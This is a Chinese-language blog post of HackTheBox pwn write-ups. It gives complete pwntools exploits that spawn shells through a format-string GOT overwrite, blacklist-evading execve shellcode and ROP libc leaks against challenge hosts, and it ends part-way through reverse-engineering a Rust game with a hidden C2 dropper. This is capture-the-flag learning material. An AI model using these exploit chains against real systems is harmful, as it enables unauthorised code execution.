---
title: "Write-ups: HackTheBox"
published: 2025-07-24
updated: 2025-08-01
description: "Write-ups for HackTheBox's pwn challenges."
image: "https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.2rvfoyyezu.avif"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# r0bob1rd

## Difficulty

- EASY

## Description

> I am developing a brand new game with robotic birds. Would you like to test my progress so far?

## Write-up

```c del={11-14, 18, 23}
unsigned __int64 operation()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h] BYREF
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("\nSelect a R0bob1rd > ");
  fflush(stdout);
  __isoc99_scanf("%d", &v1);
  if ( v1 > 9 )
    printf("\nYou've chosen: %s", (const char *)&(&robobirdNames)[v1]);
  else
    printf("\nYou've chosen: %s", (&robobirdNames)[v1]);
  getchar();
  puts("\n\nEnter bird's little description");
  printf("> ");
  fgets(s, 106, stdin);
  puts("Crafting..");
  usleep(0x1E8480u);
  start_screen();
  puts("[Description]");
  printf(s);
  return __readfsqword(0x28u) ^ v3;
}
```

观察到 `operation` 函数存在几个漏洞：

- `if ( v1 > 9 )` 没有对 `v1` 做边界检查，OOB
- `fgets(s, 106, stdin);` BOF
- `printf(s);` 格式化字符串

先看看 `robobirdNames` 附近有什么东西：

```asm showLineNumbers=false ins={12-17}
pwndbg> x/a &robobirdNames
0x6020a0 <robobirdNames>: 0x400ce8
pwndbg> x/50gx 0x6020a0-0x100
0x601fa0: 0x0000000000000000 0x0000000000000000
0x601fb0: 0x0000000000000000 0x0000000000000000
0x601fc0: 0x0000000000000000 0x0000000000000000
0x601fd0: 0x0000000000000000 0x0000000000000000
0x601fe0: 0x0000000000000000 0x0000000000000000
0x601ff0: 0x00007ffff7c58f90 0x0000000000000000
0x602000: 0x0000000000601e10 0x00007ffff7e29190
0x602010: 0x00007ffff7c15df0 0x0000000000400766
0x602020 <puts@got.plt>: 0x00007ffff7cb9420 0x0000000000400786
0x602030 <printf@got.plt>: 0x00007ffff7c96c90 0x00007ffff7d17d90
0x602040 <fgets@got.plt>: 0x00000000004007b6 0x00000000004007c6
0x602050 <signal@got.plt>: 0x00007ffff7c77f00 0x00007ffff7cb7340
0x602060 <setvbuf@got.plt>: 0x00007ffff7cb9ce0 0x00007ffff7c980b0
0x602070 <usleep@got.plt>: 0x0000000000400816 0x0000000000000000
0x602080: 0x0000000000000000 0x0000000000000000
0x602090: 0x0000000000000000 0x0000000000000000
0x6020a0 <robobirdNames>: 0x0000000000400ce8 0x0000000000400cf2
0x6020b0 <robobirdNames+16>: 0x0000000000400cff 0x0000000000400d0c
0x6020c0 <robobirdNames+32>: 0x0000000000400d18 0x0000000000400d26
0x6020d0 <robobirdNames+48>: 0x0000000000400d30 0x0000000000400d40
0x6020e0 <robobirdNames+64>: 0x0000000000400d4b 0x0000000000400d5b
0x6020f0: 0x0000000000000000 0x0000000000000000
0x602100 <stdout@@GLIBC_2.2.5>: 0x00007ffff7e226a0 0x0000000000000000
0x602110 <stdin@@GLIBC_2.2.5>: 0x00007ffff7e21980 0x0000000000000000
0x602120 <stderr@@GLIBC_2.2.5>: 0x00007ffff7e225c0 0x0000000000000000
```

注意到这个地址下方不远处就是 `got` 表，因此我们可以通过输入负索引来泄漏它，然后算出 `libc` 基址。

所以最后思路应该是泄漏 `setvbuf`，计算出 one_gadget 的地址，再利用格式化字符串漏洞篡改 `__stack_chk_fail` 为 one_gadget 地址。而为了触发 `__stack_chk_fail`，我们需要利用 `fgets` 的 BOF 来破坏 canary.

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    fmtstr_payload,
    process,
    raw_input,
    remote,
    u64,
)

FILE = "./r0bob1rd"
HOST, PORT = "94.237.122.117", 56995

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = ELF("./glibc/libc.so.6")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    target.sendlineafter(b"> ", str(-8))
    target.recvuntil(b": ")

    setvbuf = u64(target.recvline().strip().ljust(0x8, b"\x00"))
    libc.address = setvbuf - libc.sym["setvbuf"]
    one_gadget = libc.address + 0xE3B01

    fmtstr = fmtstr_payload(
        8, {elf.got["__stack_chk_fail"]: one_gadget}, write_size="short"
    )
    # raw_input("DEBUG")
    target.sendlineafter(b"> ", fmtstr.ljust(106, b"\x00"))

    target.interactive()


if __name__ == "__main__":
    main()
```

# Execute

## Difficulty

- EASY

## Description

> Can you feed the hungry code?

## Write-up

保护全开，但是栈可执行。

```c del={43} ins={16-25, 38-41}
// gcc execute.c -z execstack -o execute

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void setup() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  alarm(0x7f);
}

int check(char *blacklist, char *buf, int read_size, int blacklist_size) {
  for (int i = 0; i < blacklist_size; i++) {
    for (int j = 0; j < read_size - 1; j++) {
      if (blacklist[i] == buf[j])
        return 0;
    }
  }

  return 1337;
}

int main() {
  char buf[62];
  char blacklist[] =
      "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

  setup();

  puts("Hey, just because I am hungry doesn't mean I'll execute everything");

  int size = read(0, buf, 60);

  if (!check(blacklist, buf, size, strlen(blacklist))) {
    puts("Hehe, told you... won't accept everything");
    exit(1337);
  }

  ((void (*)())buf)();
}
```

程序对我们的输入做了一个检查，禁用了一些字节，除此以外没有太多限制。所以思路还是打 shellcode.

关于 mask 的爆破，利用了 `a ^ b ^ b = a` 的性质。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    asm,
    context,
    disasm,
    log,
    p64,
    process,
    raw_input,
    remote,
    u64,
)

FILE = "./execute"
HOST, PORT = "94.237.54.192", 31583

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    blacklist = set(b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67")
    mask = b""
    target_string = u64(b"/bin/sh".ljust(0x8, b"\x00"))

    for byte in range(0, 0x100):
        mask = int(f"{byte:02x}" * 8, 16)
        encoded = p64(mask ^ target_string)

        if all(byte not in blacklist for byte in encoded):
            log.success(f"Found mask: {hex(mask)}")
            break

    payload = asm(f"""
        mov rax, {mask}
        push rax
        mov rax, {mask} ^ {target_string}
        xor [rsp], rax
        mov rdi, rsp
        push 0
        pop rsi
        push 0
        pop rdx
        mov rbx, 0x3a
        inc rbx
        mov rax, rbx
        syscall
    """)

    log.success(disasm(payload))

    for byte in payload:
        if byte in blacklist:
            log.warn(f"Bad byte: {byte:2x}")

    # raw_input("DEBUG")
    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

# Restaurant

## Difficulty

- EASY

## Description

> Welcome to our Restaurant. Here, you can eat and drink as much as you want! Just don't overdo it..

## Write-up

只提供了 libc，为了 patchelf 还得去找对应 `ld`：

```bash collapse={4-27} ins={30}
λ ~/Projects/pwn/Restaurant/ strings libc.so.6 | grep "GLIBC"
GLIBC_2.2.5
GLIBC_2.2.6
GLIBC_2.3
GLIBC_2.3.2
GLIBC_2.3.3
GLIBC_2.3.4
GLIBC_2.4
GLIBC_2.5
GLIBC_2.6
GLIBC_2.7
GLIBC_2.8
GLIBC_2.9
GLIBC_2.10
GLIBC_2.11
GLIBC_2.12
GLIBC_2.13
GLIBC_2.14
GLIBC_2.15
GLIBC_2.16
GLIBC_2.17
GLIBC_2.18
GLIBC_2.22
GLIBC_2.23
GLIBC_2.24
GLIBC_2.25
GLIBC_2.26
GLIBC_2.27
GLIBC_PRIVATE
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
```

可以看到使用的是 `GLIBC 2.27`，通过 `glibc-all-in-one` 下载 release 版本的 GLIBC，得到对应 `ld`.

使用以下命令来 patchelf，`--set-rpath .` 是让它在当前目录下自己找 `libc.so.6`，我们只要通过 `--set-interpreter` 设置好动态连接器就行了。

```bash
sudo patchelf --set-interpreter "$(pwd)/ld-2.27.so" --set-rpath . ./restaurant
```

这个程序本身没什么复杂的，注意到只有 `fill` 函数里面的一个 `read` 存在 BOF，用它构造 ROP Chain 就好了。先泄漏 libc，然后再返回到 `fill` 二次输入。

## Exploit

```python
#!/usr/bin/env python3

from pwn import ELF, ROP, args, context, flat, process, raw_input, remote, u64

FILE = "./restaurant"
HOST, PORT = "94.237.60.55", 54861

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)
libc = ELF("./libc.so.6")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    # raw_input("DEBUG")
    target.sendlineafter(b"> ", str(1))

    payload = flat(
        b"A" * 0x28, rop.rdi.address, elf.got["puts"], elf.plt["puts"], elf.sym["fill"]
    )
    target.sendafter(b"> ", payload)

    target.recvuntil(b"\xa3\x10\x40")
    libc.address = u64(target.recv(0x6).strip().ljust(8, b"\x00")) - libc.sym["puts"]
    one_gadget = libc.address + 0x10A41C

    payload = flat(b"A" * 0x28, one_gadget)
    target.sendafter(b"> ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

# You know 0xDiablos

## Difficulty

- EASY

## Description

> I missed my flag

## Write-up

BOF，后门函数 `flag`，检测两个参数。32-bit 栈传参，没啥好说的，不过 python 整数是无限精度的，给它 -1 它就认为这是数学上的 -1，所以我们必须通过把数字截断为 32-bit 补码的形式来模拟 C 在内存中的数据表示。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    fit,
    process,
    raw_input,
    remote,
)

FILE = "./vuln"
HOST, PORT = "94.237.57.115", 42156

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    payload = fit(
        {
            0xBC: elf.sym["flag"],
            0xC0: elf.sym["exit"],
            0xC4: -559038737 & 0xFFFFFFFF,
            0xC8: -1059139571 & 0xFFFFFFFF,
        }
    )
    # raw_input("DEBUG")
    target.sendlineafter(b": ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

# TicTacToed

## Difficulty

- MEDIUM

## Description

> A lawfirm recently busted an underground network of a part-time cybermafia group. Upon investigation they found nothing but a single tic-tac-toe game on their computer. The forensics team suspect it to be more than just a game. Can you expose them ?

## Write-up

Jesus, its a Rust Pwn challenge! 迎接地狱难度的逆向分析吧。

先运行看看，感受一下程序的基本逻辑：

<center>
  <img src="https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.2yynw63u8w.avif" alt="" />
</center>

如其名，完全就是一个井字棋游戏，5 个相同棋子连成一条线就赢了。并且我们的对手……我们哪来的对手？`X` 和 `O` 的棋子都是自己控制的，谁赢谁输都是我们自行决定。嗯……这样的话应该会简单很多吧？至少不用被迫去对抗一个 AI 棋手……~_我下棋最烂了……_~

然后丢给 IDA 老婆，逆天，光是 IDA 加载并分析完这个程序都足足花了几分钟才完成，它太大了。也不知道作者在里面塞了些什么乱七八糟的东西……整个程序有整整 5.5M 大小。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  return std::rt::lang_start(&tictactoe::main, argc, argv, 0LL);
}
```

第一次做 Rust Pwn，发现反汇编出来和 C 语法都差不多，先定位 main 函数，发现叫 `tictactoe::main`。根据我之前学过的那么一丢丢 rust 语法，`tictactoe` 应该就是这个程序的 crate 名。

crate 的话就类似于其它语言中的 package 的概念，一般这些 package 下都包含了多个相关的函数实现，我们可以在 IDA 的 Function name 窗口进行搜索，发现这个 crate 里确实包含了不少东西：

<center>
  <img src="https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.9o03kwqvqb.avif" alt="" />
</center>

其中比较引人注目的应该是这个叫做 `tictactoe::execute_c2` 的函数，一眼 backdoor.

```c {57, 89-90, 104, 145}
__int64 __fastcall tictactoe::execute_c2(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  int v7; // r8d
  int v8; // r9d
  int v9; // eax
  int v10; // ecx
  int v11; // r8d
  int v12; // r9d
  int v13; // eax
  int v14; // r8d
  int v15; // r9d
  int v16; // ecx
  int v17; // r8d
  int v18; // r9d
  int v19; // r9d
  int v20; // edx
  int v21; // ecx
  int v22; // r8d
  int v23; // r9d
  int v25; // [rsp+0h] [rbp-148h]
  int v26; // [rsp+0h] [rbp-148h]
  int v27; // [rsp+0h] [rbp-148h]
  int v28; // [rsp+0h] [rbp-148h]
  int v29; // [rsp+0h] [rbp-148h]
  struct _Unwind_Exception *v30; // [rsp+0h] [rbp-148h]
  int v31; // [rsp+8h] [rbp-140h]
  int v32; // [rsp+8h] [rbp-140h]
  int v33; // [rsp+8h] [rbp-140h]
  int v34; // [rsp+8h] [rbp-140h]
  int v35; // [rsp+8h] [rbp-140h]
  int v36; // [rsp+8h] [rbp-140h]
  int v37; // [rsp+10h] [rbp-138h]
  int v38; // [rsp+10h] [rbp-138h]
  int v39; // [rsp+10h] [rbp-138h]
  int v40; // [rsp+10h] [rbp-138h]
  int v41[2]; // [rsp+10h] [rbp-138h]
  int v42; // [rsp+18h] [rbp-130h]
  char v43; // [rsp+18h] [rbp-130h]
  int v44; // [rsp+18h] [rbp-130h]
  char v45; // [rsp+18h] [rbp-130h]
  int v46; // [rsp+18h] [rbp-130h]
  int v47; // [rsp+18h] [rbp-130h]
  int v48; // [rsp+1Ch] [rbp-12Ch] BYREF
  struct _Unwind_Exception *v49; // [rsp+20h] [rbp-128h]
  int v50; // [rsp+28h] [rbp-120h]
  struct _Unwind_Exception *v51; // [rsp+30h] [rbp-118h]
  int v52; // [rsp+38h] [rbp-110h] BYREF
  int v53; // [rsp+40h] [rbp-108h]
  int v54; // [rsp+48h] [rbp-100h]
  struct _Unwind_Exception *v55; // [rsp+50h] [rbp-F8h]
  int v56[42]; // [rsp+58h] [rbp-F0h] BYREF
  struct _Unwind_Exception *v57; // [rsp+100h] [rbp-48h]
  int v58; // [rsp+108h] [rbp-40h]
  _BYTE v59[32]; // [rsp+128h] [rbp-20h] BYREF

  v6 = std::fs::write(
         (int)aTmpC2Executabl,
         18,
         (int)&off_3A4F30,
         a4,
         a5,
         a6,
         (int)aTmpC2Executabl,
         18,
         v37,
         v42,
         (int)v49,
         v50,
         (int)v51,
         v52,
         v53,
         v54,
         v55,
         v56[0]);
  core::result::Result<T,E>::expect(
    v6,
    (int)aFailedToWriteC,
    25,
    (int)&off_3A4F40,
    v7,
    v8,
    v25,
    v31,
    v38,
    v43,
    v49,
    v50);
  v9 = <std::fs::Permissions as std::os::unix::fs::PermissionsExt>::from_mode(493LL);
  v13 = std::fs::set_permissions(v26, v32, v9, v10, v11, v12, v26, v32, v39, v44, (int)v49, v50, v51, v52);
  core::result::Result<T,E>::expect(
    v13,
    (int)aFailedToSetExe,
    33,
    (int)&off_3A4F58,
    v14,
    v15,
    v27,
    v33,
    v40,
    v45,
    v49,
    v50);
  std::process::Command::new(
    (int)v56,
    v28,
    v34,
    v16,
    v17,
    v18,
    v28,
    v34,
    (int)v56,
    v46,
    (int)v49,
    v50,
    (int)v51,
    v52,
    v53,
    v54,
    (int)v55,
    v56[0],
    v56[2],
    v56[4],
    v56[6],
    v56[8],
    v56[10],
    v56[12],
    v56[14],
    v56[16],
    v56[18],
    v56[20],
    v56[22],
    v56[24],
    v56[26],
    v56[28],
    v56[30],
    v56[32],
    v56[34],
    v56[36],
    v56[38],
    v56[40],
    v57,
    v58);
  std::process::Command::spawn(&v52, *(_QWORD *)v41);
  core::result::Result<T,E>::expect(
    (int)&v48,
    (int)&v52,
    (int)aFailedToExecut,
    27,
    (int)&off_3A4F70,
    v19,
    v29,
    v35,
    v41[0],
    v47,
    (int)v49,
    v50,
    v51,
    v52);
  core::ptr::drop_in_place<std::process::Command>(v56);
  std::process::Child::wait(v59, &v48);
  core::ptr::drop_in_place<core::result::Result<std::process::ExitStatus,std::io::error::Error>>(v59);
  return core::ptr::drop_in_place<std::process::Child>((int)&v48, (int)&v48, v20, v21, v22, v23, v30, v36);
}
```

<center>
  <img src="https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.54y2hzdi2p.avif" alt="" />
</center>

进去一看虽说有一大坨，不过细看其实很简单。`std::fs::write` 将 C2 (Command and Control) 后门程序写入到 `/tmp/C2_executable` 中（程序里塞程序，难怪那么大……），并通过 `std::fs::set_permissions` 将权限设置为 `0755`，这一点可以从 `from_mode(493LL)` 看出来。接着，通过 `std::process::Command::new` 创建准备执行的命令行指令（这会设置好它的参数，环境变量等）。用脚想都可以猜出来创建的命令肯定是用来执行 C2 的，根本用不着去分析参数。然后用 `std::process::Command::spawn` 生成子进程，异步运行 Command 创建的指令。嗯……看到这里就不用继续了，后面无非就是释放空间和获取子进程的退出状态等操作，对我们来说没多大用处。

此时，我们的宏观目标已经是非常清晰的了，就是要搞清楚如何调用 `tictactoe::execute_c2`。一开始我想着可能有输入方面的漏洞，然后构造一个 ROP Chain 或者什么东西去调用它。不过我同时又清楚，Rust 以其安全性而扬名，所以题目如果是考察 Rust 的编码漏洞，那就未免有点太难了，虽然不排除确实有这个可能……总之，我在这一块还是浪费了将近一个小时，去研究 main 函数中对输入的处理是否存在什么漏洞，事实证明根本没有……

下面来分析 main 函数的基本逻辑：

```c del={100} {240}
__int64 tictactoe::main()
{
  int *v0; // rcx
  __int64 v1; // rdx
  int line; // eax
  int v3; // edx
  int v4; // r9d
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rcx
  int v8; // r8d
  int v9; // r9d
  int v10; // esi
  int v11; // edx
  int v12; // ecx
  int v13; // r8d
  int v14; // r9d
  char **v15; // rsi
  int v16; // edx
  int v17; // ecx
  int v18; // r8d
  int v19; // r9d
  int v20; // edx
  int v21; // ecx
  int v22; // r8d
  int v23; // r9d
  int v25; // edx
  int v26; // ecx
  int v27; // r8d
  int v28; // r9d
  __int64 v29; // rdx
  int v30; // [rsp+0h] [rbp-4E8h]
  struct _Unwind_Exception *v31; // [rsp+0h] [rbp-4E8h]
  struct _Unwind_Exception *v32; // [rsp+0h] [rbp-4E8h]
  struct _Unwind_Exception *v33; // [rsp+0h] [rbp-4E8h]
  __int64 v34; // [rsp+8h] [rbp-4E0h]
  int v35; // [rsp+8h] [rbp-4E0h]
  int v36; // [rsp+8h] [rbp-4E0h]
  int v37; // [rsp+8h] [rbp-4E0h]
  __int64 v38; // [rsp+10h] [rbp-4D8h]
  __int64 v39; // [rsp+18h] [rbp-4D0h]
  int v40; // [rsp+20h] [rbp-4C8h]
  char is_full; // [rsp+26h] [rbp-4C2h]
  char v42; // [rsp+27h] [rbp-4C1h]
  char v43; // [rsp+28h] [rbp-4C0h]
  int v44[2]; // [rsp+28h] [rbp-4C0h]
  struct _Unwind_Exception *v45; // [rsp+30h] [rbp-4B8h]
  __int64 *v46; // [rsp+30h] [rbp-4B8h]
  int v47; // [rsp+38h] [rbp-4B0h]
  _QWORD *v48; // [rsp+38h] [rbp-4B0h]
  struct _Unwind_Exception *v49; // [rsp+40h] [rbp-4A8h]
  struct _Unwind_Exception **v50; // [rsp+48h] [rbp-4A0h]
  int v51[2]; // [rsp+50h] [rbp-498h]
  int v52; // [rsp+5Ch] [rbp-48Ch]
  int v53[2]; // [rsp+68h] [rbp-480h]
  _QWORD *v54; // [rsp+70h] [rbp-478h]
  int v55[2]; // [rsp+78h] [rbp-470h]
  char v56[8]; // [rsp+D8h] [rbp-410h]
  char v57[8]; // [rsp+138h] [rbp-3B0h]
  int v58[2]; // [rsp+148h] [rbp-3A0h]
  int v59[25]; // [rsp+154h] [rbp-394h] BYREF
  _QWORD v60[2]; // [rsp+1B8h] [rbp-330h]
  int v61; // [rsp+1C8h] [rbp-320h]
  int v62; // [rsp+1CCh] [rbp-31Ch] BYREF
  int v63[6]; // [rsp+1D0h] [rbp-318h] BYREF
  int v64[2]; // [rsp+1E8h] [rbp-300h] BYREF
  int v65[2]; // [rsp+1F0h] [rbp-2F8h]
  char v66[8]; // [rsp+1F8h] [rbp-2F0h]
  _QWORD v67[2]; // [rsp+200h] [rbp-2E8h] BYREF
  int *v68; // [rsp+210h] [rbp-2D8h]
  int v69; // [rsp+21Ch] [rbp-2CCh] BYREF
  _BYTE v70[48]; // [rsp+220h] [rbp-2C8h] BYREF
  __int128 v71; // [rsp+250h] [rbp-298h] BYREF
  __int128 v72; // [rsp+268h] [rbp-280h] BYREF
  __int64 v73; // [rsp+278h] [rbp-270h] BYREF
  _BYTE v74[48]; // [rsp+280h] [rbp-268h] BYREF
  _BYTE v75[48]; // [rsp+2B0h] [rbp-238h] BYREF
  int v76[4]; // [rsp+2E0h] [rbp-208h] BYREF
  int v77[4]; // [rsp+2F8h] [rbp-1F0h] BYREF
  int v78[2]; // [rsp+308h] [rbp-1E0h] BYREF
  char v79[24]; // [rsp+310h] [rbp-1D8h] BYREF
  char v80[8]; // [rsp+328h] [rbp-1C0h] BYREF
  int v81[6]; // [rsp+330h] [rbp-1B8h] BYREF
  _BYTE v82[64]; // [rsp+348h] [rbp-1A0h] BYREF
  int v83[16]; // [rsp+388h] [rbp-160h] BYREF
  _BYTE v84[48]; // [rsp+3C8h] [rbp-120h] BYREF
  int v85[2]; // [rsp+3F8h] [rbp-F0h] BYREF
  __int64 v86; // [rsp+400h] [rbp-E8h]
  int v87; // [rsp+408h] [rbp-E0h]
  _BYTE v88[48]; // [rsp+410h] [rbp-D8h] BYREF
  __int128 v89; // [rsp+440h] [rbp-A8h] BYREF
  __int128 v90; // [rsp+450h] [rbp-98h] BYREF
  _BYTE v91[52]; // [rsp+460h] [rbp-88h] BYREF
  int v92; // [rsp+494h] [rbp-54h]
  __int64 v93; // [rsp+4A8h] [rbp-40h]
  __int64 v94[3]; // [rsp+4B0h] [rbp-38h] BYREF
  __int64 v95; // [rsp+4C8h] [rbp-20h]
  __int64 v96[3]; // [rsp+4D0h] [rbp-18h] BYREF

  tictactoe::detect_debugger();
  for ( *(_QWORD *)v58 = 0LL; *(_QWORD *)v58 < 5uLL; ++*(_QWORD *)v58 )
    *((_DWORD *)v60 + *(_QWORD *)v58) = 45;
  for ( *(_QWORD *)v57 = 0LL; *(_QWORD *)v57 < 5uLL; ++*(_QWORD *)v57 )
  {
    v0 = &v59[5 * *(_QWORD *)v57];
    *(_QWORD *)v0 = v60[0];
    *((_QWORD *)v0 + 1) = v60[1];
    v0[4] = v61;
  }
  v62 = 88;
  alloc::vec::Vec<T>::new(v63);
  while ( 1 )
  {
    while ( 1 )
    {
      *(_QWORD *)v64 = core::array::<impl core::iter::traits::collect::IntoIterator for &[T; N]>::into_iter(v59);
      *(_QWORD *)v65 = v1;
      while ( 1 )
      {
        *(_QWORD *)v66 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(v64);
        if ( !*(_QWORD *)v66 )
          break;
        v67[0] = core::array::<impl core::iter::traits::collect::IntoIterator for &[T; N]>::into_iter(*(_QWORD *)v66);
        v67[1] = v29;
        while ( 1 )
        {
          v39 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(v67);
          v68 = (int *)v39;
          if ( !v39 )
            break;
          v69 = *v68;
          core::fmt::rt::Argument::new_display(&v72, &v69);
          v71 = v72;
          core::fmt::Arguments::new_v1(v70, &unk_3A52E8, &v71);
          std::io::stdio::_print(v70);
          v38 = std::io::stdio::stdout();
          v73 = v38;
          v34 = <std::io::stdio::Stdout as std::io::Write>::flush(&v73);
          v93 = v34;
          if ( v34 )
          {
            v94[0] = v93;
            core::result::unwrap_failed(aCalledResultUn, 43LL, v94, &off_3A4F00, &off_3A5308);
          }
        }
        core::fmt::Arguments::new_const(v74, &off_3A52D8);
        std::io::stdio::_print(v74);
      }
      core::fmt::rt::Argument::new_display(v77, &v62);
      *(_OWORD *)v76 = *(_OWORD *)v77;
      core::fmt::Arguments::new_v1(v75, &off_3A5140, v76);
      std::io::stdio::_print(v75);
      *(_QWORD *)v78 = std::io::stdio::stdout();
      *(_QWORD *)v56 = <std::io::stdio::Stdout as std::io::Write>::flush(v78);
      v95 = *(_QWORD *)v56;
      if ( *(_QWORD *)v56 )
      {
        v96[0] = v95;
        core::result::unwrap_failed(aCalledResultUn, 43LL, v96, &off_3A4F00, &off_3A5160);
      }
      alloc::string::String::new(v79);
      *(_QWORD *)v80 = std::io::stdio::stdin();
      line = std::io::stdio::Stdin::read_line(v80, v79);
      core::result::Result<T,E>::expect(
        line,
        v3,
        (int)aFailedToReadLi,
        19,
        (int)&off_3A5178,
        v4,
        v30,
        v34,
        v38,
        v39,
        v40,
        v43,
        v45,
        v47);
      v5 = <alloc::string::String as core::ops::deref::Deref>::deref(v79);
      core::str::<impl str>::trim(v5, v6);
      core::str::<impl str>::split_whitespace((int)v83);
      core::iter::traits::iterator::Iterator::filter_map(v82, v83);
      core::iter::traits::iterator::Iterator::collect(v81, v82);
      if ( alloc::vec::Vec<T,A>::len(v81) == 2
        && *(_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 0LL, &off_3A5190) < 5uLL
        && *(_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 1LL, &off_3A51A8) < 5uLL )
      {
        *(_QWORD *)v55 = *(_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 0LL, &off_3A51C0);
        if ( *(_QWORD *)v55 >= 5uLL )
          core::panicking::panic_bounds_check(*(_QWORD *)v55, 5LL, &off_3A51D8);
        v54 = (_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 1LL, &off_3A51F0);
        *(_QWORD *)v53 = *v54;
        if ( *v54 >= 5uLL )
          core::panicking::panic_bounds_check(*(_QWORD *)v53, 5LL, &off_3A51D8);
        if ( v59[5 * *(_QWORD *)v55 + *(_QWORD *)v53] == 45 )
          break;
      }
      core::fmt::Arguments::new_const(v84, &off_3A52C8);
      std::io::stdio::_print(v84);
      core::ptr::drop_in_place<alloc::vec::Vec<usize>>((int)v81, (int)&off_3A52C8, v25, v26, v27, v28, v31, v35);
      core::ptr::drop_in_place<alloc::string::String>(v79);
    }
    v52 = v62;
    *(_QWORD *)v51 = *(_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 0LL, &off_3A5208);
    if ( *(_QWORD *)v51 >= 5uLL )
      core::panicking::panic_bounds_check(*(_QWORD *)v51, 5LL, &off_3A5220);
    v50 = (struct _Unwind_Exception **)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(
                                         v81,
                                         1LL,
                                         &off_3A5238);
    v49 = *v50;
    if ( (unsigned __int64)*v50 >= 5 )
      core::panicking::panic_bounds_check(v49, 5LL, &off_3A5220);
    v59[5 * *(_QWORD *)v51 + (_QWORD)v49] = v52;
    v48 = (_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 0LL, &off_3A5250);
    *(_QWORD *)v44 = *v48;
    v46 = (__int64 *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 1LL, &off_3A5268);
    v7 = *v46;
    *(_QWORD *)v85 = *(_QWORD *)v44;
    v86 = v7;
    v87 = v62;
    alloc::vec::Vec<T,A>::push(
      (int)v63,
      (int)v85,
      (int)&off_3A5280,
      v7,
      v8,
      v9,
      (int)v31,
      v35,
      v38,
      v39,
      v40,
      v44[0],
      (int)v46,
      (int)v48,
      v49,
      (int)v50);
    v10 = v62;
    v42 = tictactoe::check_winner(v59, (unsigned int)v62, v63);
    if ( (v42 & 1) != 0 )
    {
      core::fmt::rt::Argument::new_display(&v90, &v62);
      v89 = v90;
      v15 = &off_3A52A8;
      core::fmt::Arguments::new_v1(v88, &off_3A52A8, &v89);
      std::io::stdio::_print(v88);
      goto LABEL_40;
    }
    is_full = tictactoe::is_full(v59);
    if ( (is_full & 1) != 0 )
      break;
    if ( v62 == 88 )
      v92 = 79;
    else
      v92 = 88;
    v62 = v92;
    core::ptr::drop_in_place<alloc::vec::Vec<usize>>((int)v81, v10, v11, v12, v13, v14, v32, v36);
    core::ptr::drop_in_place<alloc::string::String>(v79);
  }
  v15 = &off_3A5298;
  core::fmt::Arguments::new_const(v91, &off_3A5298);
  std::io::stdio::_print(v91);
LABEL_40:
  core::ptr::drop_in_place<alloc::vec::Vec<usize>>((int)v81, (int)v15, v16, v17, v18, v19, v32, v36);
  core::ptr::drop_in_place<alloc::string::String>(v79);
  return core::ptr::drop_in_place<alloc::vec::Vec<(usize,usize,char)>>((int)v63, (int)v15, v20, v21, v22, v23, v33, v37);
}
```

逆天，`tictactoe::detect_debugger` 检测到程序被调试就会结束，我试了下 gdb 可以通过 `set $rip` 绕过，还有一个想法是通过 IDA 把这个调用 patch 成 `nop`，就是不清楚这两种方法会不会影响到后续的程序执行。不过以「过来人」的结论来说，我们做这题根本用不着动态调试就是了。研究怎么 patch 这个程序又浪费了我十几分钟……后来也没成功，直接放弃了，继续分析……

